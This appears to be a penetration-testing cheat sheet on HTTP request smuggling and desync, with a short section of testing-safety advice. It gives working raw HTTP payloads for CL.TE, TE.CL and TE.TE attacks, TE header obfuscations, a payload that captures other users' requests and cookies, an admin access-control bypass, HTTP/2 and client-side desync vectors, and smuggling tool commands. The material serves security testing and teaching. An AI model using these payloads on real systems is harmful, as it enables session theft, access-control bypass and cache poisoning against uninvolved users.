# HTTP Request Smuggling & Desync

> Smuggling is a parser differential: front-end and back-end disagree about where
> one request ends, and an attacker's "second" request rides inside the next
> victim's. Desync is the modern framing — CL.TE vs TE.CL is only the entry point.

## The two length headers

| Header | Who honors it |
|---|---|
| `Content-Length: N` | most clients, simple stacks |
| `Transfer-Encoding: chunked` | proxies, HTTP/1.1 stacks |

A request with both is ambiguous; the differential between what the front-end
does and what the back-end does is the exploit.

## Classic classes

| Class | Front-end | Back-end | Effect |
|---|---|---|---|
| CL.TE | trusts `Content-Length` | trusts `Transfer-Encoding` | smuggled prefix after the body |
| TE.CL | trusts `Transfer-Encoding` | trusts `Content-Length` | smuggled suffix |
| TE.TE | both accept TE, but one is obfuscated | — | which side normalizes decides |

### TE obfuscations for TE.TE

```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked          (space before colon)
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: x\r\nTransfer-Encoding: chunked
Transfer-Encoding
: chunked
```

## Detection — safe probes first

A timing probe is the gentlest signal:

```python
# CL.TE: back-end waits for the chunked terminator that never comes
POST / HTTP/1.1
Host: target
Content-Length: 4
Transfer-Encoding: chunked

1
Z
```

If that request hangs then times out, the back-end honored TE (CL.TE desync).
Mirror it for TE.CL: send a `Content-Length` longer than the body and time the
response.

Then differential probes:

```
POST / HTTP/1.1
Host: target
Content-Length: 40
Transfer-Encoding: chunked

0

GET /404check HTTP/1.1
Host: target
X: x
```

A subsequent request to `/` returning the `/404check` response is confirmation.

## Exploitation patterns

| Goal | Smuggled request |
|---|---|
| capture other users' requests | `POST /collect` with a huge `Content-Length`; victim's request lands in your body |
| bypass front-end controls | `GET /admin` where the front-end ACL blocks `/admin` |
| poison the cache | smuggled request caches attacker content under a real URL |
| steal headers | reflect the victim's `Cookie` via an app feature that echoes a header |
| response queue poisoning | smuggle a partial request; victim receives *your* response |

### Capturing victim requests

```
POST /comment HTTP/1.1
Host: target
Content-Length: 500

Comment: next-request-will-land-here
```

The next real user's request appears as the comment body. This is the strongest
demonstration — their session cookie in *your* stored content.

### Auth bypass via front-end ACL

Front-end blocks `/admin` by path; back-end never sees the same path:

```
GET / HTTP/1.1
Host: target
Content-Length: 60

GET /admin HTTP/1.1
Host: target
X-Ignore: x
```

## HTTP/2-specific desync

H2→H1 conversion is where modern smuggling lives. The `:path`, `:authority`
pseudo-headers and header-name injection into the H1 request line:

| Vector | Payload shape |
|---|---|
| `:path` override | h2 `:path: /` + `path: /admin` (duplicate, different normalization) |
| CRLF in headers | h2 header values may contain `\r\n` when the front-end validates loosely |
| `Content-Length` mismatch | h2 frame with both CL and TE; conversion emits both |
| `upgrade`/`connect` misuse | protocol conversion quirks |

Tooling: `h2c` smuggling, and `h2` support in recent `smuggler.py`.

## Client-side desync (CSD)

No front-end needed: a browser connects to the origin directly, and the *app's*
response framing desyncs the socket. CL.0 class — the back-end ignores
`Content-Length` on some resource types.

Test: browser sends `POST /` with a `Content-Length` body containing a smuggled
request; the *next* navigation is answered by the smuggled request. Used for
stored XSS on pages without reflection, and for response-queue poisoning against
other site users on the same connection.

## Tooling

```bash
# smuggler.py — CL.TE / TE.CL / TE.TE detection across paths
python3 smuggler.py -u https://target
# h2c smuggling
python3 h2csmuggler.py -x https://target http://127.0.0.1:8080
```

## Proof standard

| Claim | Evidence |
|---|---|
| desync exists | timing probe + a differential that changed the *next* request's response |
| request capture | a victim request's headers in stored content (redact cookies in the report) |
| ACL bypass | blocked path returning 200 through the smuggle |
| response queue poisoning | a user fetch receiving your response |

Timing alone is **not** a finding. The differential is.

## Safety

Smuggling interferes with *other users'* traffic. Detect minimally, demonstrate
once, and stop — a live desync on a production front-end degrades everyone
behind it. Prefer short, single-shot proofs and record timing immediately after.

## Anti-patterns

- Reporting from a timeout without a differential
- Leaving a desynced connection poisoning real users while you write up
- Assuming HTTP/2 ⇒ no smuggling (the opposite is true on conversion edges)
- Capturing and keeping other users' cookies beyond the proof
